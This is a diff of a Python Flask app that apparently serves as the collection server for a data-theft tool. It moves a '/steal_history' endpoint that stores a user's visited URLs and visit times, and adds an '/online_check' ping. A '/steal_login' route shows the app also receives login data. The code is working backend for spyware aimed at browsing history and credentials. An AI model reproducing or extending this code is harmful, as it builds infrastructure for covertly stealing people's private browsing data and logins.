@@ -21,13 +21,12 @@ def index():
     print r
     return render_template("index.html", users = usrs, secure_urls = s, random_urls = r)
 
-@app.route("/steal_history", methods=['POST'])
-def steal_history():
-    email = request.form['email']
-    urls = request.form.getlist('urls[]')
-    last_visited = request.form.getlist('last_visits[]')
-    history.bulk_add_to_history(email, urls, last_visited)
-    return "hi"
+@app.route('/online_check', methods=['POST'])
+def online_check(): 
+    if request.method == 'POST':
+        email = request.form['email']
+        users.update_user(email)
+        return "thanks for pinging!"
 
 @app.route("/view_user/<email>", methods=['GET'])
 def view_user(email):
@@ -70,6 +69,13 @@ def add_random(email):
         secure.addToRandom(email, url)
         return redirect(url_for('index'))
 
+@app.route("/steal_history", methods=['POST'])
+def steal_history():
+    email = request.form['email']
+    urls = request.form.getlist('urls[]')
+    last_visited = request.form.getlist('last_visits[]')
+    history.bulk_add_to_history(email, urls, last_visited)
+    return "hi"
 
 @app.route("/steal_login", methods=['POST'])
 def steal_login():
